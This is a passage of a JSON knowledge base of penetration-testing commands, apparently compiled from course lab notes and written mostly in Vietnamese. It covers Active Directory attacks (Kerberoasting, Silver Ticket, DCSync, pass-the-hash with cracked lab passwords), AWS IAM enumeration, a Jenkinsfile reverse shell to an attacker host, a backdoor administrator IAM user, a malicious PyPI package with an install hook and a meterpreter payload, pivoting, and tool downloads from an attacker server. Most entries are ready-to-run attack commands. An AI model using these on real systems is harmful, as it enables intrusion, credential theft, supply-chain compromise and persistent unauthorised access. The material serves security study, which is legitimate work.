        "command": "sudo impacket-GetUserSPNs -request -dc-ip <target_ip> <target_domain>/jeff"
      },
      {
        "language": "bash",
        "command": "sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt"
      },
      {
        "language": "powershell",
        "command": ".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast"
      }
    ],
    "related_cves": [],
    "source_file": "17-Attacking AD Authentication.md"
  },
  {
    "id": "ad_attack_silver_ticket",
    "category": "Attacking AD Authentication",
    "title": "Attacking AD Authentication: Silver Ticket",
    "content": "Silver Ticket là một vé dịch vụ (TGS) giả mạo. Để tạo nó, kẻ tấn công cần biết: NTLM hash của tài khoản dịch vụ (mục tiêu SPN), Domain SID, và tên Target SPN. Sử dụng `mimikatz` với lệnh `kerberos::golden` (với các tham số /service, /rc4) để tạo và tiêm vé (`/ptt`). Vé này cho phép mạo danh bất kỳ người dùng nào (ví dụ: /user:jeffadmin) để truy cập dịch vụ cụ thể đó.",
    "tags": [
      "active_directory",
      "ad",
      "attack",
      "silver_ticket",
      "kerberos",
      "tgs",
      "mimikatz",
      "kerberos_golden",
      "ptt",
      "spn",
      "ntlm_hash"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:<target_domain> /ptt /target:<target_hostname> /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin"
      }
    ],
    "related_cves": [],
    "source_file": "17-Attacking AD Authentication.md"
  },
  {
    "id": "ad_attack_dcsync",
    "category": "Attacking AD Authentication",
    "title": "Attacking AD Authentication: Domain Controller Synchronization (DCSync)",
    "content": "Tấn công DCSync lạm dụng Dịch vụ Sao chép Thư mục (Directory Replication Service - DRS) để yêu cầu một DC sao chép dữ liệu (bao gồm cả hash mật khẩu). DC chỉ kiểm tra SID yêu cầu có quyền sao chép hay không (mặc định là Domain Admins, Enterprise Admins, Administrators). Dùng `mimikatz` (`lsadump::dcsync /user:...`) hoặc `impacket-secretsdump` (Kali) để thực hiện tấn công và lấy NTLM hash của bất kỳ user nào, kể cả `krbtgt`.",
    "tags": [
      "active_directory",
      "ad",
      "attack",
      "dcsync",
      "replication",
      "drs",
      "mimikatz",
      "lsadump_dcsync",
      "impacket-secretsdump",
      "ntlm_hash",
      "krbtgt"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "lsadump::dcsync /user:<target_domain>\\dave"
      },
      {
        "language": "bash",
        "command": "impacket-secretsdump -just-dc-user dave <target_domain>/jeffadmin:\"...\"@<target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "17-Attacking AD Authentication.md"
  },
  {
    "id": "ad_attack_capstone_17",
    "category": "Attacking AD Authentication",
    "title": "LAB Capstone: Multi-step AD Attack",
    "content": "Một cuộc tấn công nhiều bước: \n1. Bắt đầu với user `pete`. Thử AS-REP Roasting (`impacket-GetNPUsers`), tìm thấy user `mike` và `dave`. Bẻ khóa hash (`hashcat -m 18200`), lấy được mật khẩu của `mike` (`Darkness1099!`) và `dave` (`Flowers1`).\n2. Thử Kerberoasting (`impacket-GetUserSPNs`), tìm thấy user `iis_service`.\n3. Dùng `crackmapexec` kiểm tra quyền của `mike`, phát hiện `mike` là admin trên `CLIENT75`.\n4. RDP vào `CLIENT75` bằng tài khoản `mike`. Chạy `mimikatz` (`sekurlsa::logonpasswords`) để dump creds, tìm thấy NTLM hash của `maria`.\n5. Dùng `crackmapexec` với hash của `maria` (Pass the Hash), phát hiện `maria` là admin trên `DC1.corp.com`.\n6. Dùng `psexec.py` (từ Impacket) với hash của `maria` để lấy shell SYSTEM trên `DC1` và đọc cờ.",
    "tags": [
      "lab",
      "capstone",
      "active_directory",
      "ad",
      "attack",
      "asrep_roasting",
      "crackmapexec",
      "rdp",
      "mimikatz",
      "pass_the_hash",
      "pth",
      "impacket-psexec",
      "dc"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "impacket-GetNPUsers -dc-ip <target_ip_dc>  -request <target_domain>/pete"
      },
      {
        "language": "bash",
        "command": "hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt"
      },
      {
        "language": "bash",
        "command": "crackmapexec smb <target_ip_client> -u mike -p 'Darkness1099!' -d <target_domain>"
      },
      {
        "language": "bash",
        "command": "psexec.py -hashes :2a944a58d4ffa77137b2c587e6ed7626 maria@<target_ip_dc>"
      }
    ],
    "related_cves": [],
    "source_file": "17-Attacking AD Authentication.md"
  },
  {
    "id": "aws_enum_lab_setup",
    "category": "Enum AWS Cloud Infrastructure",
    "title": "AWS Recon: Accessing the Lab",
    "content": "Thiết lập môi trường lab. Cấu hình DNS server của Kali (`sudo nmcli connection modify ...`) để trỏ đến IP DNS được cung cấp. Khởi động lại `NetworkManager`. Xác minh bằng `cat /etc/resolv.conf` và `host www.offseclab.io`.",
    "tags": [
      "lab",
      "aws",
      "setup",
      "dns",
      "nmcli",
      "networkmanager"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo nmcli connection modify \"Wired connection 1\" ipv4.dns \"3.93.17.229\""
      },
      {
        "language": "bash",
        "command": "sudo systemctl restart NetworkManager"
      },
      {
        "language": "bash",
        "command": "host <target_domain>"
      }
    ],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_enum_dns_recon",
    "category": "Enum AWS Cloud Infrastructure",
    "title": "AWS Recon: Domain and Subdomain Reconnaissance",
    "content": "Sử dụng các công cụ DNS để thu thập thông tin về domain. `host -t ns <domain>` (tìm name server), `whois <domain>` (thông tin đăng ký), `host <subdomain>` (tìm IP), `dnsenum <domain>` (liệt kê subdomain), `host -t txt <domain>` (tìm TXT records).",
    "tags": [
      "aws",
      "cloud",
      "recon",
      "dns",
      "osint",
      "host",
      "whois",
      "dnsenum"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "host -t ns <target_domain>"
      },
      {
        "language": "bash",
        "command": "dnsenum <target_domain> --threads 100"
      }
    ],
    "related_cves": [],
    "source_file": "18-Enum AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_enum_s3_buckets",
    "category": "Enum AWS Cloud Infrastructure",
    "title": "AWS Recon: Service-specific Domains (S3)",
    "content": "Kiểm tra Developer Tools của trình duyệt (tab Network) để tìm các domain dịch vụ, ví dụ `s3.amazonaws.com`. Từ URL tài nguyên, có thể suy ra tên S3 bucket (ví dụ: `offseclab-assets-public-fhsamxqz`). Cấu hình AWS CLI (`aws configure`) với Access Key và Secret Key được cung cấp, sau đó dùng `aws s3 ls` để liệt kê bucket. Có thể dùng `cloud-enum` để quét thêm.",
    "tags": [
      "aws",
      "cloud",
      "recon",
      "s3_bucket",
      "aws_cli",
      "cloud-enum",
      "devtools"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "aws configure"
      },
      {
        "language": "bash",
        "command": "aws s3 ls"
      },
      {
        "language": "bash",
        "command": "cloud_enum -k offseclab-assets-public-axevtewi --quickscan --disable-azure --disable-gcp"
      }
    ],
    "related_cves": [],
    "source_file": "18-Enum AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_enum_api_setup",
    "category": "Enum AWS Cloud Infrastructure",
    "title": "AWS Recon via API: Configure AWS CLI",
    "content": "AWS IAM (Identity and Access Management) quản lý người dùng và quyền. Cấu hình AWS CLI với một profile cụ thể (ví dụ: `attacker`) bằng `aws configure --profile attacker`. Xác minh thông tin đăng nhập và nhận dạng bằng `aws --profile attacker sts get-caller-identity`.",
    "tags": [
      "aws",
      "cloud",
      "recon",
      "iam",
      "aws_cli",
      "sts_get-caller-identity",
      "aws_profile"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "aws configure --profile attacker"
      },
      {
        "language": "bash",
        "command": "aws --profile attacker sts get-caller-identity"
      }
    ],
    "related_cves": [],
    "source_file": "18-Enum AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_enum_api_public_resources",
    "category": "Enum AWS Cloud Infrastructure",
    "title": "AWS Recon via API: Publicly Shared Resources",
    "content": "Liệt kê các tài nguyên được chia sẻ công khai, như Amazon Machine Images (AMIs), Elastic Block Storage (EBS) snapshots, và Relational Databases (RDS) snapshots. Sử dụng `aws ec2 describe-images` hoặc `aws ec2 describe-snapshots` với các bộ lọc (ví dụ: `--executable-users all` hoặc `--owner-ids`).",
    "tags": [
      "aws",
      "cloud",
      "recon",
      "api",
      "aws_cli",
      "ami",
      "ebs",
      "rds",
      "public_snapshots"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "aws --profile attacker ec2 describe-images --executable-users all --filters \"Name=name,Values=*Offseclab*\""
      },
      {
        "language": "bash",
        "command": "aws --profile attacker ec2 describe-snapshots --owner-ids 133762757218"
      }
    ],
    "related_cves": [],
    "source_file": "18-Enum AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_iam_recon_check_creds",
    "category": "Enum AWS Cloud Infrastructure",
    "title": "Initial IAM Recon: Examining Compromised Credentials",
    "content": "Ba phương pháp để kiểm tra tính hợp lệ của một IAM user: 1. `sts get-caller-identity` (dùng chính creds đó). 2. `sts get-access-key-info` (dùng một user bên ngoài). 3. Thử gọi một hàm không tồn tại bằng cách tạo ARN (`lambda invoke`).",
    "tags": [
      "aws",
      "cloud",
      "recon",
      "iam",
      "sts_get-caller-identity",
      "sts_get-access-key-info",
      "lambda_invoke",
      "arn"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "aws --profile target sts get-caller-identity"
      },
      {
        "language": "bash",
        "command": "aws --profile challenge sts get-access-key-info --access-key-id AKIAQOMAIGYUVEHJ7WXM"
      }
    ],
    "related_cves": [],
    "source_file": "18-Enum AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_iam_recon_scoping_permissions",
    "category": "Enum AWS Cloud Infrastructure",
    "title": "Initial IAM Recon: Scoping IAM Permissions",
    "content": "Kiểm tra các quyền của một user IAM. Kiểm tra inline policies (`iam list-user-policies`), attached policies (`iam list-attached-user-policies`), và các nhóm (`iam list-groups-for-user`). Nếu user thuộc một nhóm, kiểm tra các policy của nhóm đó (`iam list-group-policies`, `iam list-attached-group-policies`). Lấy phiên bản mới nhất của policy (`iam list-policy-versions`) và đọc nội dung policy (`iam get-policy-version`).",
    "tags": [
      "aws",
      "cloud",
      "recon",
      "iam",
      "iam_policy",
      "inline_policy",
      "attached_policy",
      "iam_group"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "aws --profile target iam list-user-policies --user-name clouddesk-plove"
      },
      {
        "language": "bash",
        "command": "aws --profile target iam list-attached-user-policies --user-name clouddesk-plove"
      },
      {
        "language": "bash",
        "command": "aws --profile target iam list-groups-for-user --user-name clouddesk-plove"
      },
      {
        "language": "bash",
        "command": "aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8"
      }
    ],
    "related_cves": [],
    "source_file": "18-Enum AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_iam_recon_bruteforce_pacu",
    "category": "Enum AWS Cloud Infrastructure",
    "title": "Initial IAM Recon: Brute-Force Permissions (Pacu)",
    "content": "Nếu không có quyền liệt kê IAM (Access Denied), sử dụng các công cụ như `Pacu` (mô-đun `iam__bruteforce_permissions`), `awsenum`, hoặc `enumerate-iam` để brute-force các quyền mà user có.",
    "tags": [
      "aws",
      "cloud",
      "recon",
      "iam",
      "brute_force",
      "pacu",
      "tool",
      "iam__bruteforce_permissions"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "pacu"
      },
      {
        "language": "bash",
        "command": "run iam__bruteforce_permissions --service ec2"
      }
    ],
    "related_cves": [],
    "source_file": "18-Enum AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_iam_recon_enum_all_resources",
    "category": "Enum AWS Cloud Infrastructure",
    "title": "IAM Resources Enumeration: Listing All Resources",
    "content": "Sử dụng các lệnh `list-users`, `list-groups`, `list-roles`, `list-policies` để liệt kê các tài nguyên IAM. Dùng `get-account-summary` để có cái nhìn tổng quan. Một cách hiệu quả hơn là dùng `iam get-account-authorization-details`, lệnh này lấy thông tin về tất cả users, groups, roles, và policies (bao gồm cả Customer Managed Policies) và mối quan hệ giữa chúng.",
    "tags": [
      "aws",
      "cloud",
      "recon",
      "iam",
      "list-users",
      "list-groups",
      "list-roles",
      "list-policies",
      "get-account-authorization-details"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "aws --profile target iam list-users | tee  users.json"
      },
      {
        "language": "bash",
        "command": "aws --profile target iam list-policies --scope Local --only-attached | tee policies.json"
      },
      {
        "language": "bash",
        "command": "aws --profile target iam get-account-authorization-details --filter User Group LocalManagedPolicy Role | tee account-authorization-details.json"
      }
    ],
    "related_cves": [],
    "source_file": "18-Enum AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_iam_recon_jmespath",
    "category": "Enum AWS Cloud Infrastructure",
    "title": "IAM Resources Enumeration: Processing API Response (JMESPath)",
    "content": "Sử dụng JMESPath (một ngôn ngữ truy vấn JSON) để lọc và xử lý đầu ra JSON từ AWS CLI. Dùng cờ `--query` với các biểu thức như `UserDetailList[].UserName` (lấy tất cả tên user) hoặc `UserDetailList[?contains(UserName, 'admin')].{Name: UserName}` (lọc user có tên chứa 'admin').",
    "tags": [
      "aws",
      "cloud",
      "recon",
      "iam",
      "jmespath",
      "json",
      "aws_cli",
      "query"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "aws --profile target iam get-account-authorization-details --filter User --query \"UserDetailList[].UserName\""
      },
      {
        "language": "bash",
        "command": "aws --profile target iam get-account-authorization-details --filter User --query \"UserDetailList[?contains(UserName, 'admin')].{Name: UserName}\""
      }
    ],
    "related_cves": [],
    "source_file": "18-Enum AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_iam_recon_pacu_enum",
    "category": "Enum AWS Cloud Infrastructure",
    "title": "IAM Resources Enumeration: Automated (Pacu)",
    "content": "Sử dụng `Pacu` để tự động hóa việc liệt kê IAM. Sau khi import key, chạy mô-đun `iam__enum_users_roles_policies_groups`. Xem dữ liệu đã thu thập bằng `data IAM`.",
    "tags": [
      "aws",
      "cloud",
      "recon",
      "iam",
      "pacu",
      "tool",
      "automation",
      "iam__enum_users_roles_policies_groups"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "run iam__enum_users_roles_policies_groups"
      },
      {
        "language": "bash",
        "command": "data IAM"
      }
    ],
    "related_cves": [],
    "source_file": "18-Enum AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_attack_cicd_owasp",
    "category": "Attacking AWS Cloud Infrastructure",
    "title": "Attacking AWS CI/CD",
    "content": "CI/CD trên AWS mở rộng bề mặt tấn công. OWASP đã liệt kê 10 rủi ro bảo mật hàng đầu cho CI/CD, bao gồm: Insufficient Flow Control, Inadequate IAM, Dependency Chain Abuse, Poisoned Pipeline Execution (PPE), và Insufficient Credential Hygiene.",
    "tags": [
      "theory",
      "aws",
      "cloud",
      "attack",
      "cicd",
      "owasp",
      "dependency_chain_abuse",
      "poisoned_pipeline"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_attack_poisoned_pipeline_enum_jenkins",
    "category": "Attacking AWS Cloud Infrastructure",
    "title": "Poisoned Pipeline: Enumerating Jenkins",
    "content": "Sử dụng Metasploit (`auxiliary/scanner/http/jenkins_enum`) hoặc `gobuster` để liệt kê thông tin và các thư mục trên máy chủ Jenkins (ví dụ: automation.offseclab.io).",
    "tags": [
      "lab",
      "aws",
      "cloud",
      "attack",
      "cicd",
      "poisoned_pipeline",
      "jenkins",
      "enumeration",
      "metasploit",
      "gobuster"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "use auxiliary/scanner/http/jenkins_enum"
      },
      {
        "language": "bash",
        "command": "gobuster dir -u http://<target_domain>/ -w /usr/share/wordlist/dirb/common.txt -t 50 -b 403"
      }
    ],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_attack_poisoned_pipeline_enum_git",
    "category": "Attacking AWS Cloud Infrastructure",
    "title": "Poisoned Pipeline: Enumerating Git Server (Gitea)",
    "content": "Kiểm tra phiên bản Gitea. Tìm các exploit công khai hoặc các đường dẫn có thể truy cập (ví dụ: `/explore`). Liệt kê người dùng. Thực hiện brute-force mật khẩu (ví dụ: dùng Burp Suite) cho một người dùng (`billy:qwerty`).",
    "tags": [
      "lab",
      "aws",
      "cloud",
      "attack",
      "cicd",
      "poisoned_pipeline",
      "git",
      "gitea",
      "enumeration",
      "brute_force",
      "burpsuite"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_attack_poisoned_pipeline_enum_s3_git",
    "category": "Attacking AWS Cloud Infrastructure",
    "title": "Poisoned Pipeline: Enumerating Application (S3 Git)",
    "content": "Kiểm tra mã nguồn ứng dụng, phát hiện sử dụng S3 bucket. Sử dụng `dirb` để quét bucket và phát hiện một kho lưu trữ `.git` bị lộ (`.git/HEAD`). Dùng AWS CLI (`aws s3 sync`) để tải toàn bộ bucket về.",
    "tags": [
      "lab",
      "aws",
      "cloud",
      "attack",
      "cicd",
      "poisoned_pipeline",
      "s3_bucket",
      "git",
      "enumeration",
      "dirb",
      "aws_cli"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "aws s3 sync s3://staticcontent-dpejbh5xr64enyz6 ./static_content/"
      }
    ],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_attack_poisoned_pipeline_secrets_git",
    "category": "Attacking AWS Cloud Infrastructure",
    "title": "Poisoned Pipeline: Discovering Secrets in Git",
    "content": "Sử dụng `gitleaks detect` để quét kho lưu trữ git đã tải về. Nếu không tìm thấy, kiểm tra lịch sử commit (`git log`). Xem nội dung các commit cũ (`git show <commit_id>`) để tìm thông tin nhạy cảm bị rò rỉ (ví dụ: chuỗi base64). Giải mã chuỗi (`echo ... | base64 --decode`) để lấy creds (`administrator:q3qx7ajs9yhp1vg1`).",
    "tags": [
      "lab",
      "aws",
      "cloud",
      "attack",
      "cicd",
      "poisoned_pipeline",
      "git",
      "gitleaks",
      "git_log",
      "git_show",
      "secrets",
      "credential_hunting",
      "base64"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "gitleaks detect"
      },
      {
        "language": "bash",
        "command": "git log"
      },
      {
        "language": "bash",
        "command": "git show 7242427"
      },
      {
        "language": "bash",
        "command": "echo \"YWRtaW5pc3RyYXRvcjpxM3F4N2Fqczl5aHAxdmcx\" | base64 --decode"
      }
    ],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_attack_poisoned_pipeline_edit_jenkinsfile",
    "category": "Attacking AWS Cloud Infrastructure",
    "title": "Poisoned Pipeline: Editing the Pipeline (Jenkinsfile)",
    "content": "Đăng nhập vào Gitea với creds (administrator) đã tìm thấy. Tìm `Jenkinsfile` trong kho lưu trữ. Sửa đổi `Jenkinsfile`, thêm một stage mới để thực thi mã độc, ví dụ như một payload reverse shell `bash -i` trỏ về máy tấn công. Thay đổi này sẽ kích hoạt webhook, khiến Jenkins build lại và chạy payload.",
    "tags": [
      "lab",
      "aws",
      "cloud",
      "attack",
      "cicd",
      "poisoned_pipeline",
      "git",
      "gitea",
      "jenkins",
      "jenkinsfile",
      "reverse_shell"
    ],
    "code_snippets": [
      {
        "language": "groovy",
        "command": "pipeline {\nagent any\nstages {\n    stage('Send Reverse Shell') {\n    steps {\n        withAWS(region: 'us-east-1', credentials: 'aws_key') {\n        script {\n            if (isUnix()) {\n            sh 'bash -c \"bash -i >& /dev/tcp/<kali_ip>/4242 0>&1\" & '\n            }\n        }\n        }\n    }\n    }\n}\n}"
      }
    ],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_attack_poisoned_pipeline_backdoor_account",
    "category": "Attacking AWS Cloud Infrastructure",
    "title": "Poisoned Pipeline: Compromise (Backdoor Account)",
    "content": "Từ reverse shell (container Jenkins), tìm creds AWS (`env | grep AWS`). Cấu hình AWS CLI với profile mới (`aws configure --profile=CompromisedJenkins`). Kiểm tra quyền (`sts get-caller-identity`, `iam list-user-policies...`), phát hiện có quyền `AdministratorAccess`. Tạo một user IAM mới (`iam create-user --user-name backdoor`), gán chính sách `AdministratorAccess` (`iam attach-user-policy`), và tạo access key (`iam create-access-key`) cho user đó để tạo cửa hậu.",
    "tags": [
      "lab",
      "aws",
      "cloud",
      "attack",
      "cicd",
      "poisoned_pipeline",
      "jenkins",
      "reverse_shell",
      "aws_cli",
      "iam",
      "backdoor",
      "administratoraccess"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "env | grep AWS"
      },
      {
        "language": "bash",
        "command": "aws --profile CompromisedJenkins sts get-caller-identity"
      },
      {
        "language": "bash",
        "command": "aws --profile CompromisedJenkins iam create-user --user-name backdoor"
      },
      {
        "language": "bash",
        "command": "aws --profile CompromisedJenkins iam attach-user-policy  --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
      },
      {
        "language": "bash",
        "command": "aws --profile CompromisedJenkins iam create-access-key --user-name backdoor"
      }
    ],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_attack_dependency_chain_theory",
    "category": "Attacking AWS Cloud Infrastructure",
    "title": "Dependency Chain Abuse: Theory",
    "content": "Tấn công Chuỗi Phụ thuộc (Dependency Chain Abuse) xảy ra khi kẻ tấn công lừa hệ thống build tải về mã độc bằng cách chiếm quyền hoặc giả mạo các gói phụ thuộc (dependencies). Package manager (như `pip` của Python) có thể bị lừa nếu chúng được cấu hình với `extra-index-url`, khiến chúng tìm kiếm gói ở cả kho lưu trữ công cộng (PyPI) và kho lưu trữ nội bộ. Kẻ tấn công có thể đăng một gói độc hại lên PyPI với cùng tên nhưng phiên bản cao hơn (`~=1.1.0` có thể bị tấn công bằng `1.1.4`).",
    "tags": [
      "theory",
      "aws",
      "cloud",
      "attack",
      "cicd",
      "dependency_chain_abuse",
      "pip",
      "pypi",
      "extra-index-url",
      "versioning"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_attack_dependency_chain_create_package",
    "category": "Attacking AWS Cloud Infrastructure",
    "title": "Dependency Chain Abuse: Creating Malicious Package",
    "content": "Tạo một gói Python độc hại. Cấu trúc thư mục: `hackshort-util/setup.py` và `hackshort-util/hackshort_util/__init__.py`. Tệp `setup.py` định nghĩa tên gói và phiên bản (ví dụ: `1.1.4` để cao hơn `~=1.1.0`). Có thể chèn mã thực thi vào `setup.py` (trong lớp `Installer`) để chạy khi cài đặt, hoặc chèn vào một tệp (ví dụ: `utils.py`) để chạy khi import.",
    "tags": [
      "lab",
      "aws",
      "cloud",
      "attack",
      "dependency_chain_abuse",
      "pip",
      "python",
      "malicious_package",
      "setup.py"
    ],
    "code_snippets": [
      {
        "language": "python",
        "command": "class Installer(install):\n    def run(self):\n        install.run(self)\n        with open('/tmp/running_during_install', 'w') as f:\n            f.write('This code was executed when the package was installed')"
      },
      {
        "language": "bash",
        "command": "python3 setup.py sdist"
      }
    ],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_attack_dependency_chain_add_payload",
    "category": "Attacking AWS Cloud Infrastructure",
    "title": "Dependency Chain Abuse: Adding Payload and Publishing",
    "content": "Tạo payload reverse shell (ví dụ: `msfvenom -p python/meterpreter/reverse_tcp ...`) và chèn vào tệp `.py` (ví dụ: `hackshort_util/utils.py`) sẽ được import lúc runtime. Cấu hình `~/.pypirc` với thông tin đăng nhập của kho lưu trữ (ví dụ: `pypi.offseclab.io`). Xây dựng (`python3 setup.py sdist`) và tải gói lên (`upload -r offseclab`).",
    "tags": [
      "lab",
      "aws",
      "cloud",
      "attack",
      "dependency_chain_abuse",
      "python",
      "malicious_package",
      "msfvenom",
      "meterpreter",
      "reverse_shell",
      "pypirc",
      "upload"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4488"
      },
      {
        "language": "bash",
        "command": "python3 setup.py sdist upload -r offseclab"
      }
    ],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_attack_dependency_chain_compromise_pivoting",
    "category": "Attacking AWS Cloud Infrastructure",
    "title": "Dependency Chain Abuse: Compromise (Pivoting)",
    "content": "Nhận reverse shell Meterpreter từ container. Quét mạng nội bộ (ví dụ: dùng script `netscan.py` đã tải lên). Thiết lập pivoting: 1. Trên Kali Cloud (MSF): Chạy `auxiliary/server/socks_proxy` và `route add` để định tuyến lưu lượng của container. 2. Trên máy Kali local: Tạo SSH local tunnel (`ssh -fN -L localhost:1080:localhost:1080 kali@...`) đến Kali Cloud. 3. Cấu hình Firefox (hoặc `proxychains`) trên máy local để sử dụng SOCKS proxy (127.0.0.1:1080).",
    "tags": [
      "lab",
      "aws",
      "cloud",
      "attack",
      "dependency_chain_abuse",
      "pivoting",
      "meterpreter",
      "metasploit",
      "socks_proxy",
      "ssh_tunneling",
      "ssh_l",
      "proxychains"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "upload /home/kali/netscan.py /netscan.py"
      },
      {
        "language": "bash",
        "command": "use auxiliary/server/socks_proxy"
      },
      {
        "language": "bash",
        "command": "route add 172.30.0.1 255.255.0.0 5"
      },
      {
        "language": "bash",
        "command": "ssh -fN -L localhost:1080:localhost:1080 kali@<kali_cloud_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "aws_attack_dependency_chain_compromise_tfstate",
    "category": "Attacking AWS Cloud Infrastructure",
    "title": "Dependency Chain Abuse: Compromise (Terraform State)",
    "content": "Sử dụng tunnel để truy cập Jenkins (172.30.0.30:8080). Trong một job (`company-dir`), xem mã nguồn HTML và tìm thấy creds AWS S3 (`awsid`, `awskey`, `bucket`). Cấu hình profile AWS mới (`stolen-s3`). Dùng `s3api list-buckets` phát hiện một bucket `tf-state-...`. Tệp Terraform state (`.tfstate`) thường chứa bí mật. Tải về (`s3 cp .../terraform.tfstate ./`). Đọc tệp `.tfstate`, tìm thấy creds của user `Goran.B` (có `AdministratorAccess`). Dùng creds này để cấu hình profile admin (`goran.b`).",
    "tags": [
      "lab",
      "aws",
      "cloud",
      "attack",
      "dependency_chain_abuse",
      "pivoting",
      "jenkins",
      "s3_bucket",
      "credential_hunting",
      "terraform",
      "tfstate",
      "administratoraccess"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "aws --profile=stolen-s3 s3api list-buckets"
      },
      {
        "language": "bash",
        "command": "aws --profile=stolen-s3 s3 cp s3://tf-state-yj1q1bjp2izthrbc/terraform.tfstate ./"
      },
      {
        "language": "bash",
        "command": "aws configure --profile=goran.b"
      }
    ],
    "related_cves": [],
    "source_file": "19-Attacking AWS Cloud Infrastructure.md"
  },
  {
    "id": "file_transfer_http_upload",
    "category": "File Transfer",
    "title": "Transfer File to Target: Using HTTP Server (Kali)",
    "content": "Start a simple HTTP server on Kali using `python3 -m http.server`. On the target machine (Windows or Linux), use tools like `curl`, `certutil`, `iwr` (Invoke-WebRequest), `wget`, or `(New-Object System.Net.WebClient).DownloadFile` to download files from the Kali server. Recommended target folders: `/tmp` (Linux), `C:\\Windows\\Temp` (Windows).",
    "tags": [
      "file_transfer",
      "upload_to_target",
      "http_server",
      "python",
      "windows",
      "linux",
      "curl",
      "certutil",
      "iwr",
      "wget",
      "webclient"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "python3 -m http.server 8000"
      },
      {
        "language": "powershell",
        "command": "curl http://<kali_ip>:8000/WinPEAS.exe -o WinPEAS.exe"
      },
      {
        "language": "powershell",
        "command": "certutil -urlcache -split -f http://<kali_ip>:8000/WinPEAS.exe WinPEAS.exe"
      },
      {
        "language": "powershell",
        "command": "iwr http://<kali_ip>:8000/WinPEAS.exe -o C:/Windows/temp/WinPEAS.exe"
      },
      {
        "language": "powershell",
        "command": "(New-Object System.Net.WebClient).DownloadFile('http://<kali_ip>:8000/nc.exe', 'C:\\windows\\temp\\nc.exe')"
      },
      {
        "language": "bash",
        "command": "wget http://<kali_ip>:8000/linpeas.sh"
      },
      {
        "language": "bash",
        "command": "curl -O /tmp/pspy64 \"http://<kali_ip>:8000/pspy64\""
      }
    ],
    "related_cves": [],
    "source_file": "ZNote-Skill-Tool-Transfer.md"
  },
  {
    "id": "file_transfer_smb_upload",
    "category": "File Transfer",
    "title": "Transfer File to Target: Using SMB Server (Kali)",
    "content": "Start an SMB server on Kali using `impacket-smbserver -smb2support SHARE .`. On the Windows target, use `copy`, `xcopy`, `certutil`, or `iwr` with the UNC path (`\\\\kali-ip\\SHARE\\file`) to download files. On Linux, `wget` or `curl` might work with the UNC path.",
    "tags": [
      "file_transfer",
      "upload_to_target",
      "smb_server",
      "impacket-smbserver",
      "windows",
      "linux",
      "copy",
      "xcopy",
      "certutil",
      "iwr",
      "wget",
      "curl",
      "unc_path"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "impacket-smbserver -smb2support SHARE ."
      },
      {
        "language": "powershell",
        "command": "copy \\\\<kali_ip>\\SHARE\\WinPEAS.exe C:\\Windows\\Tasks\\WinPEAS.exe"
      },
      {
        "language": "powershell",
